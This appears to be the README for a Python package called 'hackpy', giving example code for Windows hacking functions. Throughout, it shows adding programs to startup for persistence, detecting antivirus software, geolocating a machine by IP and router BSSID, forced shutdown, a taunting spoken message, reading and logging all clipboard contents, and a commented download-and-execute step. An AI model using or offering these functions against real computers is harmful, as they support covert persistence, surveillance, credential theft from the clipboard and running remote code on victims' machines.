![Python](https://www.python.org/static/img/python-logo@2x.png)
# `pip install hackpy`
![](https://picua.org/images/2019/07/02/a565a62aa7c27eb1339c6cb0be7c9d49.png)

# Example usage:
``` python
import os
import hackpy

hackpy.clean() # Remove all hackpy temp files from system
hackpy.load(architecture=64) # default it 32

# Autorun
hackpy.autorun('C:\\Windows\\System32\\cmd.exe', 'test_name', state=True) # Add cmd.exe to startup
hackpy.autorun('C:\\Windows\\System32\\cmd.exe', 'test_name', state=False) # Remove cmd.exe from startup

# Detect installed antivirus software on computer:
data = hackpy.detect_protection()
for antivirus in data:
    print('[!] - Antivirus detected: ' + antivirus + ', install path: ' + data[antivirus])

# Information about you IP:
data = hackpy.ip_info()
print('[?] - You IP is: ' + data['query'])
print('[?] - You live in: ' + data['country'] + ', country code: ' + data['countryCode'])
# Return dict: {"query", "status", "country", "countryCode", "region", "regionName", "city", "zip", "lat", "lon", "timezone", "isp", "org", "as", "local"}

# Information about other IP:
data = hackpy.ip_info('216.58.215.110')
print('[?] - Other Information about IP:\n' + str(data))
# Return dict: {"query", "status", "country", "countryCode", "region", "regionName", "city", "zip", "lat", "lon", "timezone", "isp", "org", "as"}

# Get router bssid:
bssid_string = hackpy.router() # BETA
# Find LATITUDE and LONGITUDE with router BSSID:
data = hackpy.bssid_locate(bssid_string)
print('LATITUDE: ' + str(data['lat']) + ', LONGITUDE: ' + str(data['lon']) + ', RANGE: ' + str(data['range']))

# Nircmdc reference: https://nircmd.nirsoft.net
hackpy.command.nircmdc('monitor off')
hackpy.command.nircmdc('speak text \"HAHAHAHAHHAH IM FIND YOU!\"')
# System commands
hackpy.command.system('shutdown -s -t 0')

# Get text from clipboard:
data = hackpy.clipboard.get()
print('Text in clipboard is ' + data)

# Set text to clipboard:
hackpy.clipboard.set('Hello from LimerBoy and HackPy!!')

# Clipboard logger:
hackpy.clipboard.logger('clip_logs.txt') # Log ALL clipboard changes.
# It is recommended to use with threading !!!

# Download python and install it:
hackpy.install_python('3.6.0', path = 'C:\\python36') # Default version is 3.7.0 and install path is C:\python37

# Load and execute file from internet
# file = hackpy.wget(direct.link.here)
# os.startfile(file)
```

<br> *nircmdc reference: https://nircmd.nirsoft.net* <br>

![SITE](https://i.ibb.co/znRLN0D/image.png)
